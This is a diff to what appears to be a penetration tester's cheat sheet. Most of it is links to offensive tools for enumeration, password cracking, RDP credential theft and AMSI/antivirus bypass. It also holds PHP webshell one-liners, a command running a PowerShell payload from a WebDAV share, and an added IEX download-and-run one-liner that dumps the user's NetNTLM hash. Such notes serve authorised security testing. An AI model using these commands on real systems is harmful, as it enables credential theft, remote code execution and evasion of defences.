@@ -1,5 +1,12 @@
 # Web 
 
+# Enumeration
+
+## Screenshot enumeration
+https://github.com/byt3bl33d3r/WitnessMe
+https://github.com/sensepost/gowitness
+
+
 ## Wordlists
 
 https://wordlists.assetnote.io \
@@ -7,8 +14,15 @@ https://github.com/danielmiessler/SecLists \
 https://github.com/xajkep/wordlists 
 
 <br />
+## GraphQL
 
+https://github.com/dolevf/graphw00f
 
+## JWT
+
+https://github.com/ticarpi/jwt_tool
+https://jwt.io/
+https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities
 
 ## Webshells
 PHP \
@@ -40,7 +54,10 @@ Using backticks\
 Using backticks\
 `<?php echo ```whoami```; ?>`
 
-## Email enumeration
+https://github.com/d4rkiZ/ProcOpen-PHP-Webshell
+https://github.com/kraken-ng/Kraken
+
+# Email enumeration
 ## SimplyEmail
 ```
 source ~/python2env/bin/activate
@@ -53,6 +70,7 @@ Enumerate the names of each person working at a company and convert it to a spec
 python3 linkedin2username.py -u <username> -p <password> -c linkedin-name
 ```
 
+https://github.com/gremwell/o365enum
 
 ## Mendix
 Look for authorisation issues.
@@ -95,7 +113,7 @@ Wordlists: \
 https://github.com/ohmybahgosh/RockYou2021.txt \
 https://raw.githubusercontent.com/OpenTaal/opentaal-wordlist/master/wordlist.txt \
 https://github.com/OpenTaal/opentaal-wordlist
-
+https://weakpass.com/wordlist
 
 Resources and tools: \
 https://github.com/JakeWnuk/HIBPv7-Resources \
@@ -105,7 +123,8 @@ Rules:\
 https://github.com/rarecoil/pantagrule \
 https://github.com/Unic0rn28/hashcat-rules/blob/main/unicorn%20rules/SuperUnicorn.rule \
 https://github.com/NotSoSecure/password_cracking_rules  \
-https://github.com/n0kovo/hashcat-rules-collection
+https://github.com/n0kovo/hashcat-rules-collection \
+https://github.com/golem445/Corporate_Masks
 
 ## Password Spraying / Login 
 
@@ -132,6 +151,8 @@ https://github.com/tokyoneon/CredPhish
 ## RDP Attacks
 
 https://github.com/0x09AL/RdpThief
+Mitm RDP tool
+https://github.com/GoSecure/pyrdp
 
 ## Petite Potam
 PetitPotam
@@ -424,6 +445,10 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 
 # Windows
 
+## Bloodhound
+
+https://github.com/CompassSecurity/BloodHoundQueries
+
 Directory name bypasses:
 ```
 C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
@@ -447,7 +472,24 @@ DOCUME~1 Documents and Settings
 NVIDIA~1 NVIDIA Corporation
 SYSTEM~1 System Volume Information
 ```
+# Windows Privilige Escalation
 
+Get hash of current user
+```
+powershell -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('https://github.com/elnerd/Get-NetNTLM/raw/master/Get-NetNTLM.ps1'); Get-NetNTLM-Hash"
+```
+
+## Enumeration scripts
+https://github.com/carlospolop/PEASS-ng
+
+
+## AMSI / AV Bypass
+https://github.com/RythmStick/AMSITrigger
+https://amsi.fail/
+https://github.com/danielbohannon/Invoke-Obfuscation
+https://github.com/JoelGMSec/Invoke-Stealth
+
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack
  # Physical attacks
   
   
